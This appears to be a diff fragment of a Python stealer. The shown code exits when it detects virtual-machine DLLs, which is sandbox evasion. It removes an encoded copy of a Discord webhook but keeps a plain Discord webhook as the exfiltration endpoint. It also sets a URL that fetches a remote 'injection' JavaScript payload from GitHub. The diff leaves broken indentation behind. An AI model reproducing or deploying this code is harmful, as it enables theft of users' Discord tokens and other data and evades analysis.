@@ -227,10 +227,7 @@ def check_dll():
     if os.path.exists(os.path.join(sys_root, "System32\\vmGuestLib.dll")) or os.path.exists(os.path.join(sys_root, "vboxmrxnp.dll")):
         exit_program('VM Detected')
 
-_h_enc = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxNzc2OTA0MzYzNTg2MzYyMy9PZnZvc2J0SVpIRDhHcklWZnJhWVpPUDlpUy1NR2R3M0gxRHdCTmtIQVFtSlRPbDBnNHZvYXZzVWRZLUtKUlprdGJtcQ=="
-try:
-    h00k = "https://discord.com/api/webhooks/1263599279260303361/L-lgQPLOuyh1zu_uMGvWq7-XBwfyN42nF4fEuw5AKL-djoxoof0kRRfDZlfQ-kCG7gos"
-except Exception:
+
     h00k = "https://discord.com/api/webhooks/1263599279260303361/L-lgQPLOuyh1zu_uMGvWq7-XBwfyN42nF4fEuw5AKL-djoxoof0kRRfDZlfQ-kCG7gos"
 inj3c710n_url = f"https://raw.githubusercontent.com/0x00G/injection/main/index.js"
 
